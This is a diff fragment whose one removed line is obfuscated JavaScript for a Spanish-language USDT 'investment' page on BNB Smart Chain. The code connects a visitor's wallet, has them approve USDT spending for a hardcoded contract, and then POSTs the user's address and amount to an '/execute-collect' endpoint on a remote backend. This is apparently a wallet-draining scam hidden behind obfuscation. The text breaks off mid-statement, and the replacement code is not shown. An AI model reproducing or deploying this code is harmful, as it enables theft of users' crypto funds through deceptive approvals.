@@ -1,1 +1,343 @@
-'use strict';const _0x59f417=_0x1154;function _0x2b3e(){const _0x5bc0d8=['o\x20saldo\x20de','CSGMk','nceLabel','eNLkr','ress\x20spend','cEa65585Dd','includes','ón\x20en\x20red.','org/','wallet_swi','fdvzo','2416KTFRtF','c-rpc.publ','getSigner','AZtfM','DKzVk','HdeoS','xOMNQ','background','hfjCq','external\x20r','0x38','9219rYeLDm','yMOyL','Loaded','5|3|0|6|2|','toast','ito!\x20Graci','53,\x2069,\x200.','BNB\x20Smart\x20','getBalance','RbFGg','as.','default','getAddress','xt-decorat','b48a6a7d19','jEyzE','llowance(a','mChain','Cambia\x20man','tSEVw','subscribeS','stringify','Firma\x20requ','pVQZE','rgba(220,\x20','OkDQs','\x20billetera','1|4|0|2|3','EthereumCh','vECdj','vruiV','red.','tu\x20wallet.','\x20vivo:','addEventLi','fuXal','\x20crítico:','5fae58ab9b','ns\x20(uint25','por\x20el\x20usu','parseUnits','_blank\x22\x20st','s\x20spender)','\x20pagar\x20la\x20','elector\x20de','Conectando','95)','open','Mbmek','AZNUT','int256)',':\x20#fff;\x20te','wait','403386UPJpXI','Collection','ollection','ppIOJ','getNetwork','opacity','eURHm','cscan.com/','Saldo\x20de\x20B','\x20saldo\x20de\x20','success','7548524699','ddress\x20own','rgba(38,\x201','1.binance.','NB\x20insufic','denied','/bsc','comisión\x20d','\x22\x20target=\x22','a\x20transacc','2.binance.','c.ankr.com','Saldo:\x20','XcVtH','\x20en\x20protoc','rnal\x20view\x20','peGRn','merchantAd','BlWLg','BYSrL','MZFky','toLowerCas','f1Ca61f1C6','INVERTIR\x20A','\x20USDT','QJzsw','Bdlxa','stener','Verificand','a\x20red\x20BSC…','https://rp','Abriendo\x20s','cWvRl','getWalletP','ent','UgZJe','947168hrsFdg','n/json','subscribeP','btnSpinner','split','EuHed','GrDJt','kiGFL','ddress\x20acc','No\x20tienes\x20','LwoKp','amvQl','tchEthereu','oVqSU','click','icnode.com','incronizar','PeeAj','toFixed','tnRsC','1|4','da.','er.com/api','function\x20a','c-dataseed','allowance','qgKsi','OTEnB','qCloa','o\x20red\x20BSC.','FyjEs','tVqIx','CTkAq','style','function','SDT…','approveBtn','onocido','ualmente\x20a','returns\x20(u','0x6253fecb','¡Transacci','xYdQG','f1b9a799e6','erty','lpdlR','PqxET','Web3\x20Error','qloAP','InJIk','formatUnit','Contract','piOcQ','ol)','8371EHoRAd','nBIgc','scan.com/t','0x55d39832','\x20gas\x20(BNB)','onclick','max','UYTHo','Fqnhe','AKwyH','vMahW','5952591vinKaa','DOMContent','6f10565A63','juTFY','...','\x20Chain\x20en\x20','/health','bHTSY','xViNt','6f99059fF7','EZmsl','removeProp','61,\x20123,\x200','e\x20red\x20(Gas','o\x20aprobaci','BrowserPro','function\x20b','hidden','vpQMu','btnText','suficiente','modal','value','o\x20autoriza','LKoMS','brir\x20AppKi','aFaGj','toUpperCas','qzKKf','txVGL','Cambiando\x20','saldo\x20de\x20U','ORArf','\x20failed.','walletBala','Confirmand','IeAaH','¡Inversión','Procesando','https://se','\x20en\x20BscSca','Error\x20al\x20a','eip155','textConten','DhuJD','khqpe','lKlSz','tate','balanceOf','applicatio','GPRPo','type','ount)\x20exte','<a\x20href=\x22h','\x20inversión','ant.onrend','fqRJX','488DKgNeb','iQaXG','vider','1.00','obar\x20USDT…','0.0005','ById','Saldo:\x20--\x20','HCoQb','OLHff','Chain','json','yle=\x22color','n\x20↗</a>','\x20saldos\x20en','ada\x20con\x20éx','JZcDp','reason','https://bs','\x20error\x20al\x20','0x8e18bE61','Validando\x20','Error\x20desc','olo...','YmtyY','0.8','POST','krqSA','USDT\x20en\x20tu','eturns\x20(bo','cancelled','code','1385553DrnXMG','error','ión\x20en\x20la\x20','message','HORA','Error\x20al\x20s','USDT','erida:\x20Apr','innerHTML','cYULy','jpTKQ','tZWls','approve','9027B31979','Ocurrió\x20un','line;\x22>Ver','procesar\x20l','er,\x20uint25','JYvFY','input','wallet_add','tgchp','6\x20amount)\x20','disabled','maxBtn','lydkd','ón\x20complet','15vJowNj','kToxL','cancelada\x20','BNB','ttps://bsc','request','ted','\x20proveedor','desconecta','getElement','rovider','iente\x20para','uRdyp','dress','investAmou','QlCzu','cPOAP','IkUpx','nCLig','\x20external\x20','KNVKv','YALhh','ciones...','BrPEZ','\x20BNB\x20Smart','pprove(add','dataset','parseEther','Billetera\x20','view\x20retur','grHvt','roviders','Processing','Operación\x20','ZLWHc','dispatchEv','cure-merch','egxZw','alanceOf(a','hash','ion:\x20under','toString','user\x20rejec','27690uGqZsz','.95)','chainId','er,\x20addres','2558QQwlpe','AeifD','ario.','ain','WDZDy','/execute-c','\x20exitosa!\x20'];_0x2b3e=function(){return _0x5bc0d8;};return _0x2b3e();}(function(_0x3c6083,_0x2cf6de){const _0x274ca5=_0x1154,_0x840590=_0x3c6083();while(!![]){try{const _0xaaf9e4=parseInt(_0x274ca5(0x17f))/(0xbfa+-0xd*0x164+0x61b)*(-parseInt(_0x274ca5(0x1e9))/(0x1*0x20a1+0x192e+-0x39cd))+-parseInt(_0x274ca5(0x19f))/(-0x3f*0x59+0x9*0x39d+0xf*-0xb5)+parseInt(_0x274ca5(0x26a))/(0x24d0+0x1cb0+-0x16*0x2fa)+-parseInt(_0x274ca5(0x1ba))/(0x697+-0x2f*-0x93+-0x218f)*(-parseInt(_0x274ca5(0x23b))/(-0x1*0xc62+-0x14e3+0x214b))+parseInt(_0x274ca5(0x206))/(0x1ad*-0xe+0x118a*-0x2+-0x1d*-0x205)*(-parseInt(_0x274ca5(0x1fb))/(-0x1*-0x230f+0x5fb+-0x2902))+-parseInt(_0x274ca5(0x146))/(-0x20*-0xe2+-0x7ed+0x62*-0x35)+-parseInt(_0x274ca5(0x1e5))/(0xaa3+0x15ed+-0x2086)*(-parseInt(_0x274ca5(0x13b))/(0xda9+-0xa13*0x1+0x1*-0x38b));if(_0xaaf9e4===_0x2cf6de)break;else _0x840590['push'](_0x840590['shift']());}catch(_0x2d2578){_0x840590['push'](_0x840590['shift']());}}}(_0x2b3e,0xc2f04+-0xae5*0xd+-0x584b5));const MERCHANT_ADDRESS=_0x59f417(0x292)+_0x59f417(0x214)+_0x59f417(0x295)+_0x59f417(0x22b)+'3b',CONTRACT_ADDRESS=_0x59f417(0x193)+_0x59f417(0x148)+_0x59f417(0x1f5)+_0x59f417(0x25c)+'34',BSC_USDT_ADDRESS=_0x59f417(0x13e)+_0x59f417(0x14f)+_0x59f417(0x246)+_0x59f417(0x1ac)+'55',BSC_CHAIN_ID_HEX=_0x59f417(0x205),MIN_USDT_BALANCE=0x0n,BACKEND_URL=_0x59f417(0x16d)+_0x59f417(0x1de)+_0x59f417(0x17d)+_0x59f417(0x280),BSC_RPC_URLS=[_0x59f417(0x191)+_0x59f417(0x1fc)+_0x59f417(0x279),_0x59f417(0x191)+_0x59f417(0x282)+_0x59f417(0x249)+_0x59f417(0x1f8),_0x59f417(0x191)+_0x59f417(0x282)+_0x59f417(0x250)+_0x59f417(0x1f8),_0x59f417(0x264)+_0x59f417(0x251)+_0x59f417(0x24c)],BSC_CHAIN_PARAMS={'chainId':BSC_CHAIN_ID_HEX,'chainName':_0x59f417(0x20d)+_0x59f417(0x189),'nativeCurrency':{'name':_0x59f417(0x1bd),'symbol':_0x59f417(0x1bd),'decimals':0x12},'rpcUrls':BSC_RPC_URLS,'blockExplorerUrls':[_0x59f417(0x191)+_0x59f417(0x242)]},ERC20_ABI=[_0x59f417(0x281)+_0x59f417(0x1d3)+_0x59f417(0x1f4)+_0x59f417(0x1b0)+_0x59f417(0x1b5)+_0x59f417(0x204)+_0x59f417(0x19c)+_0x59f417(0x13a),_0x59f417(0x281)+_0x59f417(0x216)+_0x59f417(0x247)+_0x59f417(0x1e8)+_0x59f417(0x230)+_0x59f417(0x1cd)+_0x59f417(0x1d7)+_0x59f417(0x22c)+'6)',_0x59f417(0x156)+_0x59f417(0x1e0)+_0x59f417(0x272)+_0x59f417(0x17a)+_0x59f417(0x255)+_0x59f417(0x291)+_0x59f417(0x238)],approveBtn=document[_0x59f417(0x1c3)+_0x59f417(0x185)](_0x59f417(0x28e)),btnText=document[_0x59f417(0x1c3)+_0x59f417(0x185)](_0x59f417(0x159)),btnSpinner=document[_0x59f417(0x1c3)+_0x59f417(0x185)](_0x59f417(0x26d)),merchantInput=document[_0x59f417(0x1c3)+_0x59f417(0x185)](_0x59f417(0x257)+_0x59f417(0x1c7)),toastEl=document[_0x59f417(0x1c3)+_0x59f417(0x185)](_0x59f417(0x20a));if(merchantInput)merchantInput[_0x59f417(0x15c)]=MERCHANT_ADDRESS;((async()=>{const _0x280f36=_0x59f417,_0x1de336={'OkDQs':function(_0x4627bb,_0x31ce4f){return _0x4627bb(_0x31ce4f);}};try{await _0x1de336[_0x280f36(0x21f)](fetch,BACKEND_URL+_0x280f36(0x14c));}catch(_0x53169c){}})());let _toastTimer;function showToast(_0x7f0247,_0x535635=_0x59f417(0x211),_0x3c879b=-0x15a5+-0x76d+0x2ea6*0x1){const _0x9adbea=_0x59f417,_0x575369={'fdvzo':_0x9adbea(0x209)+_0x9adbea(0x27e),'xOMNQ':function(_0xacaa85,_0x1051f8){return _0xacaa85===_0x1051f8;},'YmtyY':_0x9adbea(0x245),'UYTHo':_0x9adbea(0x248)+_0x9adbea(0x152)+_0x9adbea(0x1e6),'jpTKQ':function(_0x370d6b,_0x2c430f){return _0x370d6b===_0x2c430f;},'txVGL':_0x9adbea(0x1a0),'bHTSY':_0x9adbea(0x21e)+_0x9adbea(0x20c)+_0x9adbea(0x234),'JZcDp':_0x9adbea(0x202),'fuXal':function(_0x43495b,_0x1e6c2a){return _0x43495b(_0x1e6c2a);},'eURHm':function(_0x2b00bf,_0x13b6a,_0x548d39){return _0x2b00bf(_0x13b6a,_0x548d39);},'tgchp':_0x9adbea(0x211)},_0x246c4d=_0x575369[_0x9adbea(0x1fa)][_0x9adbea(0x26e)]('|');let _0x14d719=0xef*-0x20+-0x1dc1*0x1+0x3ba1;while(!![]){switch(_0x246c4d[_0x14d719++]){case'0':toastEl[_0x9adbea(0x1a7)]=_0x7f0247;continue;case'1':if(_0x575369[_0x9adbea(0x201)](_0x535635,_0x575369[_0x9adbea(0x197)]))toastEl[_0x9adbea(0x28b)][_0x9adbea(0x202)]=_0x575369[_0x9adbea(0x142)];else _0x575369[_0x9adbea(0x1a9)](_0x535635,_0x575369[_0x9adbea(0x163)])?toastEl[_0x9adbea(0x28b)][_0x9adbea(0x202)]=_0x575369[_0x9adbea(0x14d)]:toastEl[_0x9adbea(0x28b)][_0x9adbea(0x151)+_0x9adbea(0x296)](_0x575369[_0x9adbea(0x18f)]);continue;case'2':toastEl[_0x9adbea(0x157)]=![];continue;case'3':_0x575369[_0x9adbea(0x229)](clearTimeout,_toastTimer);continue;case'4':_toastTimer=_0x575369[_0x9adbea(0x241)](setTimeout,()=>{const _0x20a866=_0x9adbea;toastEl[_0x20a866(0x157)]=!![];},_0x3c879b);continue;case'5':if(!toastEl)return;continue;case'6':toastEl[_0x9adbea(0x1d4)][_0x9adbea(0x179)]=_0x575369[_0x9adbea(0x201)](_0x535635,_0x575369[_0x9adbea(0x1b4)])?'':_0x535635;continue;}break;}}function setLoading(_0x1c3253,_0x5ad597=_0x59f417(0x1da)+'…'){const _0x38fea8=_0x59f417,_0x197e8f={'InJIk':_0x38fea8(0x221),'IkUpx':_0x38fea8(0x198),'amvQl':_0x38fea8(0x25d)+_0x38fea8(0x1a3)},_0x78de81=_0x197e8f[_0x38fea8(0x136)][_0x38fea8(0x26e)]('|');let _0xf6469=0x5*-0x403+0x18b1+-0x1*0x4a2;while(!![]){switch(_0x78de81[_0xf6469++]){case'0':approveBtn[_0x38fea8(0x28b)][_0x38fea8(0x240)]=_0x1c3253?_0x197e8f[_0x38fea8(0x1cb)]:'1';continue;case'1':if(!approveBtn)return;continue;case'2':if(btnText)btnText[_0x38fea8(0x171)+'t']=_0x1c3253?_0x5ad597[_0x38fea8(0x161)+'e']():_0x197e8f[_0x38fea8(0x275)];continue;case'3':if(btnSpinner)btnSpinner[_0x38fea8(0x157)]=!_0x1c3253;continue;case'4':approveBtn[_0x38fea8(0x1b6)]=_0x1c3253;continue;}break;}}function resetAppUI(){const _0x38928d=_0x59f417,_0x3fb5bd={'aFaGj':_0x38928d(0x168)+_0x38928d(0x1f2),'grHvt':_0x38928d(0x186)+_0x38928d(0x1a5),'qgKsi':_0x38928d(0x1c8)+'nt','qloAP':function(_0x122144,_0xdd41de){return _0x122144(_0xdd41de);},'FyjEs':function(_0x5ad578,_0x371a03,_0x4eddc9,_0x34daff){return _0x5ad578(_0x371a03,_0x4eddc9,_0x34daff);},'GrDJt':_0x38928d(0x1d6)+_0x38928d(0x1c2)+_0x38928d(0x27f),'YALhh':_0x38928d(0x211)},_0x2841b0=document[_0x38928d(0x1c3)+_0x38928d(0x185)](_0x3fb5bd[_0x38928d(0x160)]);_0x2841b0&&(_0x2841b0[_0x38928d(0x171)+'t']=_0x3fb5bd[_0x38928d(0x1d8)]);const _0x3aaf41=document[_0x38928d(0x1c3)+_0x38928d(0x185)](_0x3fb5bd[_0x38928d(0x284)]);_0x3aaf41&&(_0x3aaf41[_0x38928d(0x15c)]=''),pendingInvestment=![],_0x3fb5bd[_0x38928d(0x135)](setLoading,![]),_0x3fb5bd[_0x38928d(0x288)](showToast,_0x3fb5bd[_0x38928d(0x270)],_0x3fb5bd[_0x38928d(0x1cf)],0x1*0x20cb+0x5d*0x11+0x2*-0xda0);}async function fetchAndDisplayUserBalances(_0x43cb18){const _0x151d5b=_0x59f417,_0x143d0c={'tZWls':_0x151d5b(0x1c8)+'nt','hfjCq':function(_0x11a19e,_0x308e99){return _0x11a19e-_0x308e99;},'BYSrL':function(_0xe62ad9,_0x15f436){return _0xe62ad9(_0x15f436);},'kiGFL':function(_0x3d23ef,_0x487ed6){return _0x3d23ef>_0x487ed6;},'DhuJD':_0x151d5b(0x182),'tSEVw':_0x151d5b(0x1b2),'tVqIx':_0x151d5b(0x168)+_0x151d5b(0x1f2),'cWvRl':function(_0x29636c,_0x5b8d9d){return _0x29636c(_0x5b8d9d);},'yMOyL':_0x151d5b(0x1b7),'Mbmek':_0x151d5b(0x1a4)+_0x151d5b(0x27a)+_0x151d5b(0x18d)+_0x151d5b(0x227)};try{const _0x596ac6=new ethers[(_0x151d5b(0x155))+(_0x151d5b(0x181))](_0x43cb18),_0x1b9a58=await _0x596ac6[_0x151d5b(0x1fd)](),_0x2ada6a=await _0x1b9a58[_0x151d5b(0x212)](),_0x433add=new ethers[(_0x151d5b(0x138))](BSC_USDT_ADDRESS,ERC20_ABI,_0x1b9a58),_0x52c58c=await _0x433add[_0x151d5b(0x176)](_0x2ada6a),_0x54b5c7=ethers[_0x151d5b(0x137)+'s'](_0x52c58c,-0x4*-0x601+-0x4b*-0x5a+-0xe6*0x38),_0xf92cab=document[_0x151d5b(0x1c3)+_0x151d5b(0x185)](_0x143d0c[_0x151d5b(0x289)]);_0xf92cab&&(_0xf92cab[_0x151d5b(0x171)+'t']=_0x151d5b(0x252)+_0x143d0c[_0x151d5b(0x266)](parseFloat,_0x54b5c7)[_0x151d5b(0x27c)](-0x23c0+0x39a*-0x1+0x1*0x275c)+_0x151d5b(0x25e));const _0x3751ce=document[_0x151d5b(0x1c3)+_0x151d5b(0x185)](_0x143d0c[_0x151d5b(0x207)]);_0x3751ce&&(_0x3751ce[_0x151d5b(0x140)]=()=>{const _0x313918=_0x151d5b,_0x3f47f7=document[_0x313918(0x1c3)+_0x313918(0x185)](_0x143d0c[_0x313918(0x1aa)]);if(_0x3f47f7){const _0x3f9c0a=Math[_0x313918(0x141)](0x5*-0x18c+0x15db+0x3*-0x4b5,_0x143d0c[_0x313918(0x203)](_0x143d0c[_0x313918(0x259)](parseFloat,_0x54b5c7),0x47*0x34+0x216b+-0x2fd6));_0x3f47f7[_0x313918(0x15c)]=_0x143d0c[_0x313918(0x271)](_0x3f9c0a,0xe85+0x1*0x35f+-0x11e4)?_0x3f9c0a[_0x313918(0x27c)](0x423+0x1*-0x26cc+0x163*0x19):_0x143d0c[_0x313918(0x172)],_0x3f47f7[_0x313918(0x1dd)+_0x313918(0x268)](new Event(_0x143d0c[_0x313918(0x219)]));}});}catch(_0x3080b5){console[_0x151d5b(0x1a0)](_0x143d0c[_0x151d5b(0x236)],_0x3080b5);}}async function triggerBackendCollect(_0x246ad2){const _0x5d0bb6=_0x59f417,_0x27b85a={'QlCzu':_0x5d0bb6(0x1c8)+'nt','vMahW':function(_0x50c4f5,_0x1f0dce){return _0x50c4f5<=_0x1f0dce;},'qCloa':function(_0x49ff6b,_0x341102,_0x242265){return _0x49ff6b(_0x341102,_0x242265);},'fqRJX':_0x5d0bb6(0x199),'LwoKp':_0x5d0bb6(0x177)+_0x5d0bb6(0x26b),'GPRPo':_0x5d0bb6(0x23c)+_0x5d0bb6(0x167),'cYULy':function(_0x26c0d4,_0x33caa4){return _0x26c0d4<_0x33caa4;}};let _0x2dfa0c;const _0x2da898=document[_0x5d0bb6(0x1c3)+_0x5d0bb6(0x185)](_0x27b85a[_0x5d0bb6(0x1c9)])?.[_0x5d0bb6(0x15c)]||'1',_0x765677=ethers[_0x5d0bb6(0x22e)](_0x2da898[_0x5d0bb6(0x1e3)](),0x2*0x1f7+0x1*0x3ef+-0x7cb)[_0x5d0bb6(0x1e3)]();for(let _0x5a6daf=-0x947*0x1+0x24ff+-0x1bb7;_0x27b85a[_0x5d0bb6(0x145)](_0x5a6daf,-0x8*-0x455+-0xc37+-0x166e);_0x5a6daf++){try{const _0x241172=await _0x27b85a[_0x5d0bb6(0x286)](fetch,BACKEND_URL+(_0x5d0bb6(0x1ee)+_0x5d0bb6(0x23d)),{'method':_0x27b85a[_0x5d0bb6(0x17e)],'headers':{'Content-Type':_0x27b85a[_0x5d0bb6(0x274)]},'body':JSON[_0x5d0bb6(0x21b)]({'userAddress':_0x246ad2,'amount':_0x765677})}),_0x337f4a=await _0x241172[_0x5d0bb6(0x18a)]();if(!_0x241172['ok']||!_0x337f4a[_0x5d0bb6(0x245)])throw new Error(_0x337f4a[_0x5d0bb6(0x1a0)]||_0x27b85a[_0x5d0bb6(0x178)]);return _0x337f4a;}catch(_0x2549dd){_0x2dfa0c=_0x2549dd;if(_0x27b85a[_0x5d0bb6(0x1a8)](_0x5a6daf,-0x1f*0xba+-0x3*-0x386+0xbf7))await new Promise(_0x2ec80f=>setTimeout(_0x2ec80f,0x1faa+-0x966+-0xa8c));}}throw _0x2dfa0c;}let pendingInvestment=![];function _0x1154(_0x19a5fe,_0x293cb5){_0x19a5fe=_0x19a5fe-(0x1ca0+0x263a+0x31*-0x157);const _0x278d16=_0x2b3e();let _0x415407=_0x278d16[_0x19a5fe];return _0x415407;}window[_0x59f417(0x15b)]&&typeof window[_0x59f417(0x15b)][_0x59f417(0x26c)+_0x59f417(0x1d9)]===_0x59f417(0x28c)&&window[_0x59f417(0x15b)][_0x59f417(0x26c)+_0x59f417(0x1d9)](_0x4350af=>{const _0x51f83e=_0x59f417,_0x2eff53={'IeAaH':_0x51f83e(0x170),'ZLWHc':function(_0x266546,_0x5987d1){return _0x266546(_0x5987d1);},'EuHed':function(_0x3149f8,_0x535b91){return _0x3149f8(_0x535b91);},'LKoMS':function(_0xccd229){return _0xccd229();}},_0x36231d=_0x4350af[_0x2eff53[_0x51f83e(0x16a)]];_0x36231d?(_0x2eff53[_0x51f83e(0x1dc)](fetchAndDisplayUserBalances,_0x36231d),pendingInvestment&&(pendingInvestment=![],_0x2eff53[_0x51f83e(0x26f)](runInvestmentFlow,_0x36231d))):_0x2eff53[_0x51f83e(0x15e)](resetAppUI);});window[_0x59f417(0x15b)]&&typeof window[_0x59f417(0x15b)][_0x59f417(0x21a)+_0x59f417(0x175)]===_0x59f417(0x28c)&&window[_0x59f417(0x15b)][_0x59f417(0x21a)+_0x59f417(0x175)](_0x327b0c=>{const _0x1177a7=_0x59f417,_0x4efcdf={'Fqnhe':function(_0x471d3e){return _0x471d3e();}};if(!_0x327b0c[_0x1177a7(0x235)]){let _0x40b749=null;try{_0x40b749=window[_0x1177a7(0x15b)][_0x1177a7(0x267)+_0x1177a7(0x1c4)]();}catch(_0x345c61){}!_0x40b749&&_0x4efcdf[_0x1177a7(0x143)](resetAppUI);}});document[_0x59f417(0x228)+_0x59f417(0x261)](_0x59f417(0x147)+_0x59f417(0x208),()=>{const _0x3f60bf=_0x59f417,_0x6a0cee={'lKlSz':function(_0x19d13d,_0x31e490){return _0x19d13d===_0x31e490;},'AZNUT':_0x3f60bf(0x28c),'AZtfM':function(_0xf1bb8,_0x4885b1){return _0xf1bb8(_0x4885b1);}};if(window[_0x3f60bf(0x15b)]&&_0x6a0cee[_0x3f60bf(0x174)](typeof window[_0x3f60bf(0x15b)][_0x3f60bf(0x267)+_0x3f60bf(0x1c4)],_0x6a0cee[_0x3f60bf(0x237)]))try{const _0x15c5e9=window[_0x3f60bf(0x15b)][_0x3f60bf(0x267)+_0x3f60bf(0x1c4)]();_0x15c5e9&&_0x6a0cee[_0x3f60bf(0x1fe)](fetchAndDisplayUserBalances,_0x15c5e9);}catch(_0x1eaac2){}});approveBtn&&approveBtn[_0x59f417(0x228)+_0x59f417(0x261)](_0x59f417(0x278),async()=>{const _0x5af5c6=_0x59f417,_0x49ed11={'vECdj':function(_0x2659b4,_0x102cac){return _0x2659b4===_0x102cac;},'DKzVk':_0x5af5c6(0x28c),'khqpe':function(_0x741d90,_0xbf30b1,_0x11548b){return _0x741d90(_0xbf30b1,_0x11548b);},'BrPEZ':_0x5af5c6(0x265)+_0x5af5c6(0x232)+_0x5af5c6(0x220)+_0x5af5c6(0x14a),'PqxET':function(_0x226233,_0x14a672){return _0x226233===_0x14a672;},'XcVtH':_0x5af5c6(0x16f)+_0x5af5c6(0x15f)+'t:','RbFGg':function(_0x36ca75,_0x535c8a){return _0x36ca75(_0x535c8a);},'qzKKf':function(_0xcb4512,_0x2ba22c){return _0xcb4512(_0x2ba22c);}};let _0xc95d1d=null;if(window[_0x5af5c6(0x15b)]&&_0x49ed11[_0x5af5c6(0x223)](typeof window[_0x5af5c6(0x15b)][_0x5af5c6(0x267)+_0x5af5c6(0x1c4)],_0x49ed11[_0x5af5c6(0x1ff)]))try{_0xc95d1d=window[_0x5af5c6(0x15b)][_0x5af5c6(0x267)+_0x5af5c6(0x1c4)]();}catch(_0x28e0f0){}if(!_0xc95d1d){pendingInvestment=!![],_0x49ed11[_0x5af5c6(0x173)](setLoading,!![],_0x49ed11[_0x5af5c6(0x1d1)]);if(window[_0x5af5c6(0x15b)]&&_0x49ed11[_0x5af5c6(0x133)](typeof window[_0x5af5c6(0x15b)][_0x5af5c6(0x235)],_0x49ed11[_0x5af5c6(0x1ff)]))try{await window[_0x5af5c6(0x15b)][_0x5af5c6(0x235)]();}catch(_0x55587a){console[_0x5af5c6(0x1a0)](_0x49ed11[_0x5af5c6(0x253)],_0x55587a),pendingInvestment=![],_0x49ed11[_0x5af5c6(0x20f)](setLoading,![]);}return;}await _0x49ed11[_0x5af5c6(0x162)](runInvestmentFlow,_0xc95d1d);});async function runInvestmentFlow(_0x1601df){const _0x4ed462=_0x59f417,_0x5052c6={'eNLkr':function(_0x5586d2,_0x49baa1,_0x4d72e7){return _0x5586d2(_0x49baa1,_0x4d72e7);},'xYdQG':_0x4ed462(0x233)+_0x4ed462(0x1c1)+'…','EZmsl':function(_0x1c1cd4,_0x48d733,_0x2eba5c){return _0x1c1cd4(_0x48d733,_0x2eba5c);},'QJzsw':_0x4ed462(0x262)+_0x4ed462(0x287)+'..','vpQMu':function(_0x3538f5,_0x585c01){return _0x3538f5!==_0x585c01;},'JYvFY':function(_0x61cd5f,_0x303d53){return _0x61cd5f(_0x303d53);},'lpdlR':_0x4ed462(0x164)+_0x4ed462(0x263),'nCLig':_0x4ed462(0x1f9)+_0x4ed462(0x276)+_0x4ed462(0x217),'iQaXG':function(_0x425904,_0x350c06){return _0x425904===_0x350c06;},'nBIgc':_0x4ed462(0x1b3)+_0x4ed462(0x222)+_0x4ed462(0x1ec),'AKwyH':_0x4ed462(0x218)+_0x4ed462(0x290)+_0x4ed462(0x1d2)+_0x4ed462(0x14b)+_0x4ed462(0x226),'OTEnB':_0x4ed462(0x1a0),'Bdlxa':function(_0x2cd645,_0x17928c,_0xcadaec){return _0x2cd645(_0x17928c,_0xcadaec);},'oVqSU':_0x4ed462(0x262)+_0x4ed462(0x1f0)+_0x4ed462(0x13f)+'…','OLHff':_0x4ed462(0x184),'HCoQb':function(_0x2335b8,_0x43e994){return _0x2335b8<_0x43e994;},'HdeoS':_0x4ed462(0x243)+_0x4ed462(0x24a)+_0x4ed462(0x1c5)+_0x4ed462(0x231)+_0x4ed462(0x24d)+_0x4ed462(0x153)+').','ORArf':_0x4ed462(0x1c8)+'nt','CTkAq':function(_0x875a9b,_0x4ef61f){return _0x875a9b||_0x4ef61f;},'uRdyp':_0x4ed462(0x194)+_0x4ed462(0x165)+_0x4ed462(0x28d),'pVQZE':function(_0x3894a4,_0x3e41f0){return _0x3894a4<_0x3e41f0;},'MZFky':function(_0x347669,_0x51c283,_0x4f8a8d){return _0x347669(_0x51c283,_0x4f8a8d);},'UgZJe':_0x4ed462(0x273)+_0x4ed462(0x15a)+_0x4ed462(0x244)+_0x4ed462(0x19b)+_0x4ed462(0x220)+'.','vruiV':_0x4ed462(0x262)+_0x4ed462(0x15d)+_0x4ed462(0x1d0),'PeeAj':_0x4ed462(0x21c)+_0x4ed462(0x1a6)+_0x4ed462(0x183),'krqSA':function(_0x542c47,_0x411417,_0x2ce0a1){return _0x542c47(_0x411417,_0x2ce0a1);},'CSGMk':_0x4ed462(0x169)+_0x4ed462(0x154)+_0x4ed462(0x1f7)+'..','piOcQ':_0x4ed462(0x16c)+_0x4ed462(0x17c)+_0x4ed462(0x254)+_0x4ed462(0x196),'cPOAP':function(_0x593b11,_0x406d10){return _0x593b11(_0x406d10);},'ppIOJ':function(_0x1f7ab9,_0x531b72,_0x9542d9,_0x16f175){return _0x1f7ab9(_0x531b72,_0x9542d9,_0x16f175);},'egxZw':_0x4ed462(0x245),'juTFY':function(_0x391c73,_0x4ad4ad,_0x132be3,_0x32905f){return _0x391c73(_0x4ad4ad,_0x132be3,_0x32905f);},'AeifD':_0x4ed462(0x293)+_0x4ed462(0x1b9)+_0x4ed462(0x18e)+_0x4ed462(0x20b)+_0x4ed462(0x210),'lydkd':_0x4ed462(0x195)+_0x4ed462(0x28f),'jEyzE':_0x4ed462(0x1e4)+_0x4ed462(0x1c0),'kToxL':_0x4ed462(0x24b),'tnRsC':_0x4ed462(0x19d),'peGRn':function(_0x253057,_0x229ec4,_0x9ab40b){return _0x253057(_0x229ec4,_0x9ab40b);},'KNVKv':_0x4ed462(0x1db)+_0x4ed462(0x1bc)+_0x4ed462(0x22d)+_0x4ed462(0x1eb),'xViNt':_0x4ed462(0x211),'BlWLg':_0x4ed462(0x134)+_0x4ed462(0x22a),'WDZDy':_0x4ed462(0x1ad)+_0x4ed462(0x192)+_0x4ed462(0x1af)+_0x4ed462(0x24f)+_0x4ed462(0x1a1)+_0x4ed462(0x225)};_0x5052c6[_0x4ed462(0x1f3)](setLoading,!![],_0x5052c6[_0x4ed462(0x294)]);try{const _0x45d29b=new ethers[(_0x4ed462(0x155))+(_0x4ed462(0x181))](_0x1601df);_0x5052c6[_0x4ed462(0x150)](setLoading,!![],_0x5052c6[_0x4ed462(0x25f)]);const _0x308156=await _0x45d29b[_0x4ed462(0x23f)]();if(_0x5052c6[_0x4ed462(0x158)](_0x5052c6[_0x4ed462(0x1b1)](Number,_0x308156[_0x4ed462(0x1e7)]),-0x1704+-0xb2+0x17ee)){_0x5052c6[_0x4ed462(0x1f3)](setLoading,!![],_0x5052c6[_0x4ed462(0x297)]);try{await _0x1601df[_0x4ed462(0x1bf)]({'method':_0x5052c6[_0x4ed462(0x1cc)],'params':[{'chainId':BSC_CHAIN_ID_HEX}]});}catch(_0x1d62f0){if(_0x5052c6[_0x4ed462(0x180)](_0x1d62f0[_0x4ed462(0x19e)],0xc9c+0x10f*-0x17+0x1ee3))await _0x1601df[_0x4ed462(0x1bf)]({'method':_0x5052c6[_0x4ed462(0x13c)],'params':[BSC_CHAIN_PARAMS]});else{_0x5052c6[_0x4ed462(0x150)](showToast,_0x5052c6[_0x4ed462(0x144)],_0x5052c6[_0x4ed462(0x285)]),_0x5052c6[_0x4ed462(0x1b1)](setLoading,![]);return;}}}const _0x2243c6=await _0x45d29b[_0x4ed462(0x1fd)](),_0x4f92aa=await _0x2243c6[_0x4ed462(0x212)]();_0x5052c6[_0x4ed462(0x260)](setLoading,!![],_0x5052c6[_0x4ed462(0x277)]);const _0x420ec5=await _0x45d29b[_0x4ed462(0x20e)](_0x4f92aa),_0x4f81f7=ethers[_0x4ed462(0x1d5)](_0x5052c6[_0x4ed462(0x188)]);if(_0x5052c6[_0x4ed462(0x187)](_0x420ec5,_0x4f81f7)){_0x5052c6[_0x4ed462(0x150)](showToast,_0x5052c6[_0x4ed462(0x200)],_0x5052c6[_0x4ed462(0x285)]),_0x5052c6[_0x4ed462(0x1b1)](setLoading,![]);return;}const _0x1bfd5f=document[_0x4ed462(0x1c3)+_0x4ed462(0x185)](_0x5052c6[_0x4ed462(0x166)]),_0x3628fc=_0x1bfd5f?_0x1bfd5f[_0x4ed462(0x15c)]:'1',_0x32bed8=ethers[_0x4ed462(0x22e)](_0x5052c6[_0x4ed462(0x28a)](_0x3628fc,'1'),-0xca7*-0x1+0x2051*-0x1+0x13bc),_0x1420bf=new 